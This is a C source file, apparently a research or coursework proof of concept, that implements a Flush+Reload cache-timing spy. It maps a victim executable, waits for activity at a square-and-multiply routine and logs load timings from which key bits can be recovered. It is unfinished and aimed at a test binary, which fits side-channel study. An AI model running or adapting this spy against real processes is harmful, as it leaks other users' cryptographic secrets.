#include <fcntl.h> // TODO remove unneeded libs
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>

#define THRESHOLD (int) 180
#define CYCLE_AMOUNT (int) 200000

//#define MEASUREMENT_THRESHOLD // toggle for 0/1 measurements

// DaGe f+r implementation
#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?

#define TESTEXEC_WINDOWS

#define DEBUG
//#define DEBUG_PLUS
//#define DEBUG_TIME


typedef struct node {
    char *adrs;
    struct node *next;
} node_t;

typedef struct adresses{
    int amount;
    node_t *probe_adresses;
}adresses_t;


// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    #ifdef DEBUG_TIME
    printf("measured time is %li\n", time);
    #endif
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;

    // where are we using edx?
    // when do we write something into %1?? and output (%0)
    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    #ifdef DEBUG_TIME
    printf("measured time is %li\n", time);
    #endif
    return time; 
}

int probe(char *adrs)
{
#ifndef MEASUREMENT_THRESHOLD
    return probe_precise(adrs);
#else
    return probe_treshold(adrs);
#endif
}

// spy process probing certain memory addresses
// https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c
static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

// write measurements to file
void writer(char **target_adrs, int adrs_amount, unsigned int measurements[][CYCLE_AMOUNT])
{
    char name_buf[50];
    char result_buf[20];
    for(int i = 0; i<adrs_amount; i++)
    {
        char *ptr = target_adrs[i];
        sprintf(name_buf, "measurements/measurements_%p_%lld.txt", ptr, rdtsc());
        FILE *file = fopen(name_buf, "w");
        if (file == NULL)
        {
            printf("Failed to open the file (fopen).\n");
            exit(EXIT_FAILURE); // Exit
        }
        for (int j=0; j<CYCLE_AMOUNT; j++)
        {
            sprintf(result_buf, "%d\n", measurements[i][j]);
            fprintf(file, result_buf);
        }
        fclose(file);
    }
}

adresses_t *file_loader(char *file_path)
{
    // TODO
    // load and parse lines
    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen(file_path, "r");
    if (fp == NULL)
    {
        perror("Error reading adress file (fopen)!\n");
        exit(EXIT_FAILURE);
    }
    
    // init linked list
    node_t *node_head;
    node_t *node_current;
    int head_set = 1;
    int adrs_counter = 0;
    while ((read = getline(&line, &len, fp)) != -1) {
        node_t *node_new = (node_t *) malloc(sizeof(node_t));
        node_new->adrs = line;
        if (head_set)
        {
            node_head = node_new;
            node_current = node_head;
            head_set = 0;
        } else {
            node_current->next = node_new;
            node_current = node_new;
        }
        adrs_counter++;        
    }
    node_current->next = NULL;

    fclose(fp);
    free(line);

    // fill values to struct
    adresses_t *adresses = (adresses_t *) malloc(sizeof(adresses_t));
    adresses->amount = adrs_counter;
    adresses->probe_adresses = node_head;
    return adresses;
}

/**
 * loop
 * probe addresses and safe results in lists (or define length ("buffer") at beginning and just fill array)
 * wait (how to ensure constant duration of time slots?)
 * if no cache hits for X times or array full finish and create files with timings
 */
void spy(char **target_adrs, int adrs_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    unsigned int measurements[adrs_amount][CYCLE_AMOUNT]; // results
    for(int cur_slot=0;cur_slot<CYCLE_AMOUNT;cur_slot++)
    {
        // update time stamps
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            //printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
            //busy_wait((2500-tsc+old_tsc) / 50);
            tsc = rdtsc();
        }
        #ifdef DEBUG_PLUS
        printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
        #endif
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            measurements[cur_adr_i][cur_slot]=probe(ptr); 
            #ifdef DEBUG_PLUS
            printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
            #endif                                                                                            // add timing to array for persistence 
        }
                                                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
    }
    writer(target_adrs, adrs_amount, measurements);
    printf("end spy\n");
}

void lurk(char* target_base_adrs, char **target_adrs, int adrs_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    while(1)
    {
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        bool detected = probe_treshold(target_base_adrs);
        if (detected)
        {
            printf("Detected %d victim activity - starting spy \n", detected);
            spy(target_adrs, adrs_amount);
            break;
        }
    }
}

void control()
{
    // addresses ------
    #ifdef TESTEXEC_WINDOWS
    int amount_address_offsets = 2;
    int target_offset[2];
    target_offset[0]    = 61;
    target_offset[1]    = 84;

    char* target_base   = (char *) 0x555555555149; 

    // base should be 0x100401080 (square_and_multiply) or 0x1004010fe (main)

    // base linux 0x5555555551c7 main, 0x555555555149 sqm
    #endif
    // --------------------

    int map_len         = 20000; // max size bytes?

    FILE *file_pointer = fopen("/home/jia/Documents/flush-reload/testexec", "r");
    int file_descriptor = fileno(file_pointer);     // hard coded path to open the executable used by the victim 
    printf("fd has value %i\n", file_descriptor);
    void *base = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
    //void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
    if (base == MAP_FAILED) {
        perror("mmap failed!");
        exit(EXIT_FAILURE);
    }
    // TODO offsets (?)

    // TODO run until detection and terminate after
    
    char *target_adrs[amount_address_offsets];
    for (int i= 0; i<amount_address_offsets; i++)
    {
        target_adrs[i]=(char *) target_base+target_offset[i];
    }

    #ifdef DEBUG
    printf("addresses are %p and %p, binary mapped to %p \n", target_adrs[0], target_adrs[1], target_base); // debug
    #endif
    int adrs_amount = 2;
    lurk(target_base, target_adrs, adrs_amount);
}

// default address values (?)
int main()
{
    #ifdef DEBUG_PLUS
    void (*fPtrSpy)() = &spy;
    int (*fPtrMain)() = &main;
    void (*fPtrWriter)() = &writer;
    void (*fPtrControl)() = &control;
    printf("Adresse der Funktion spy: %p, main %p, writer %p, control %p\n", fPtrSpy, fPtrMain, fPtrWriter, fPtrControl);
    #endif
    printf("starting\n");
    control();   
    printf("finished\n");    
}

// compile without cygwin1.dll, execute with cygwin1.dll in System32